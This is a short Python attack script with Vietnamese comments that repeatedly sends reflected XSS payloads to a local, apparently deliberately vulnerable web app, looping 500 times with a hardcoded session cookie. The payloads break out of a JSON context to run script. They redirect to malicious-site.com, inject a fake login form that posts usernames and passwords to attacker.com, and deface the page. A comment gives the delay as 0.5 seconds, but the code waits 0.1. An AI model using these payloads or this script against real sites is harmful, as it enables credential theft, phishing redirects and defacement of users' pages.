import requests
import time

# URL gốc với payload XSS đã mã hóa
url = "http://192.168.10.10/xss_json.php"

# Danh sách các payload tấn công XSS
payloads = [
    "\"}]}';prompt(0)</script>",
    "\"}]}';<img src=x onload=alert('XSS')>//",
    "\"}]}';<button onclick=alert('XSS via onclick')>Click me</button>//",
    "\"}]}';<script>window.location='http://malicious-site.com';</script>//",
    "\"}]}';<form action='http://attacker.com/login.php' method='POST'><input type='text' name='username' placeholder='Username'><input type='password' name='password' placeholder='Password'><button type='submit'>Login</button></form>//",
    "\"}]}';<img src='#' onmouseover='alert(\"XSS\")'>//",
    "\"}]}';<script>document.body.innerHTML='<h1>Hacked by XSS</h1>';</script>//"
]

# Số lượng request cần thực hiện
num_requests = 500

# Cookie cần gửi
cookies = {
    'security_level': '0',
    'PHPSESSID': 'hsgaj3d1fdmnp9mhgq0h7410e7'  # Thay PHPSESSID bằng giá trị thực tế
}

# Hàm thực hiện request
def send_xss_requests():
    for i in range(num_requests):
        for payload in payloads:
            # Tham số GET chứa payload XSS
            params = {
                'title': payload,
                'action': 'search'
            }

            # Gửi request GET kèm theo cookies
            response = requests.get(url, params=params, cookies=cookies)

            # Kiểm tra kết quả trả về
            if response.status_code == 200:
                print(f"Request {i+1}: Thành công")
            else:
                print(f"Request {i+1}: Thất bại")

            # Chờ 0.5 giây trước khi thực hiện request tiếp theo
            time.sleep(0.1)

# Thực hiện request
send_xss_requests()
